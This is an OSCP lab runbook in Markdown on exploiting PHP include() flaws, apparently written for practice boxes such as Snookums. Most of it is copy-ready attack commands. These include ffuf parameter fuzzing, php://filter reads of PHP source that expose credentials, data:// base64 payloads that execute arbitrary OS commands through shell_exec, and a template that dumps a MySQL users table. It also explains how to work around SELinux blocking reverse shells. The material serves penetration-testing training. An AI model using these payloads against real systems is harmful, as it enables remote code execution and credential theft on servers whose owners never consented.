---
tags: [oscp, web-app, rfi, lfi, data-wrapper, runbook]
box_sources: [Snookums]
---

# Web App — RFI / data:// Execution

*A web app passes user input into PHP's `include()` — test for remote file inclusion, then escalate to code execution via stream wrappers when HTTP RFI is firewalled.*

---

| Command | Evidence | Works when | Notes | ✅ Go to | ❌ If nothing works |
|---|---|---|---|---|---|
| `ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u "http://$BoxIP/SCRIPT.php?FUZZ=php://filter/convert.base64-encode/resource=SCRIPT.php" -fs <baseline> -t 50 -s` | ffuf prints a parameter name with different response size | You suspect include() but don't know the parameter name | Baseline size = curl the page with no params and `\| wc -c`. Any hit means the param is passed to include(). Check all PHP files, not just index. | Test for LFI below | Try POST body fuzzing: ffuf `-X POST -d "FUZZ=php://filter/..."` |
| `curl -s "http://$BoxIP/image.php?img=php://filter/convert.base64-encode/resource=TARGET.php" \| grep -oP '[A-Za-z0-9+/]{20,}={0,2}' \| tail -1 \| base64 -d` | PHP source of TARGET.php | LFI confirmed (include() present) | Reads PHP source without executing it — reveals credentials, other include() calls, and app logic. Use `{200,}` for large files, `{20,}` + `tail -1` for small ones. | Read db.php, config.php etc for creds | Try `tail -2`, `tail -3` if output is wrong |
| `PAYLOAD=$(echo -n '<?php echo shell_exec("id"); ?>' \| base64 -w0 \| sed 's/+/%2B/g'); curl -s "http://$BoxIP/VULN.php?$Param=data://text/plain;base64,$PAYLOAD"` | `uid=48(apache)` in HTML response | `allow_url_include = On` (PHP 5.x common) | **`+` MUST be URL-encoded as `%2B`** — `+` in query strings decodes as a space, silently corrupting base64. The `data://` wrapper needs no outbound network — it encodes the payload in the URL itself. | [[Shell - Upgrade]] or see CLI enumeration below | Test with `php://filter` first to confirm include() is running. If `data://` returns nothing, `allow_url_include` may be Off — try LFI log poisoning instead. |
| `PAYLOAD=$(echo -n '<?php echo "###"; echo shell_exec("CMD 2>&1"); echo "###"; ?>' \| base64 -w0 \| sed 's/+/%2B/g'); curl -s "..." \| tr '\n' ' ' \| grep -oP '###\K[^#]+'` | Command output between `###` markers | data:// RCE working | General-purpose one-liner for running any OS command. Replace CMD. Use `###` markers to extract output cleanly from surrounding HTML. | Enumerate, read files, or use mysql CLI for DB access | If `###` markers don't appear at all, PHP is erroring before the first echo — check if the base64 has `+` chars and that `%2B` is applied |

---

## Why Reverse/Bind Shells Fail Under SELinux httpd_t

When `id` output shows `context=system_u:system_r:httpd_t:s0`, SELinux is in enforcing mode for Apache:

- **Reverse shell hangs ~60s then dies** → httpd_t blocks outbound TCP. PHP tries to connect, times out.
- **Bind shell opens nothing** → httpd_t blocks binding new ports.
- **Solution:** stay in the web channel. Use data:// RCE to run OS commands via `shell_exec()`. Use the `mysql` CLI binary if no PHP MySQL extension:

```bash
PAYLOAD=$(echo -n '<?php echo "###"; echo shell_exec("mysql -h 127.0.0.1 -u root -pPASSWORD DBNAME -e \"SELECT * FROM users;\" 2>&1"); echo "###"; ?>' | base64 -w0 | sed 's/+/%2B/g')
curl -s "http://$BoxIP/VULN.php?$Param=data://text/plain;base64,$PAYLOAD" | tr '\n' ' ' | grep -oP '###\K[^#]+'
```

Check MySQL extension availability with:
```bash
PAYLOAD=$(echo -n '<?php echo function_exists("mysqli_connect") ? "MYSQLI_YES" : "MYSQLI_NO"; ?>' | base64 -w0 | sed 's/+/%2B/g')
```

---

## URL Encoding Reference for data:// Payloads

| Base64 char | URL-encoded form | Why it matters |
|---|---|---|
| `+` | `%2B` | `+` in query string = space. Corrupts base64. **Always encode.** |
| `/` | Usually OK in query values | Treated as a path sep only in URL paths, not query strings |
| `=` | Usually OK in query values | Padding — servers generally preserve it |

**Template (copy this every time):**
```bash
PAYLOAD=$(echo -n '<?php YOUR_CODE_HERE; ?>' | base64 -w0 | sed 's/+/%2B/g')
curl -s "http://$BoxIP/VULN.php?$Param=data://text/plain;base64,$PAYLOAD"
```

---

## Screenshot Prompts

> 📸 After ffuf finds the parameter: `shot web-rfi-param`
> 📸 After data:// executes `id`: `shot rce-data`

---

**Module:** [[09. Common Web Application Attacks|Common Web Application Attacks]]

---

## External Resources

| Resource | Link | Use when |
|---|---|---|
| HackTricks — File Inclusion | [src/pentesting-web/file-inclusion/README.md](https://github.com/HackTricks-wiki/hacktricks/blob/master/src/pentesting-web/file-inclusion/README.md) | Full LFI/RFI reference; section "LFI / RFI using PHP wrappers & protocols" covers `php://filter` and `data://` in depth. Local copy: `ht read pentesting-web/file-inclusion` |
| PayloadsAllTheThings — Wrappers | [File Inclusion/Wrappers.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/File%20Inclusion/Wrappers.md) | Quick payload reference for every PHP stream wrapper — `php://filter`, `data://`, `expect://`, `zip://`, `phar://` |
| PayloadsAllTheThings — File Inclusion | [File Inclusion/](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion) | LFI bypass payloads: null byte, double encoding, path truncation, filter bypass; also LFI2RCE paths |
| RevShells | [revshells.com](https://www.revshells.com) | PHP reverse shell one-liners when a shell is reachable — check for SELinux `httpd_t` in `id` first; if present, stay in-web-channel |
| CyberChef | [CyberChef](https://gchq.github.io/CyberChef/) | Encode PHP payloads to base64 for `data://`; use "To Base64" then manually replace `+` with `%2B` |
| ippsec.rocks | Search [php wrapper](https://ippsec.rocks/?#php%20wrapper) · [rfi](https://ippsec.rocks/?#rfi) · [lfi](https://ippsec.rocks/?#lfi) | Video walkthroughs of PHP wrapper and RFI techniques on real HTB boxes |
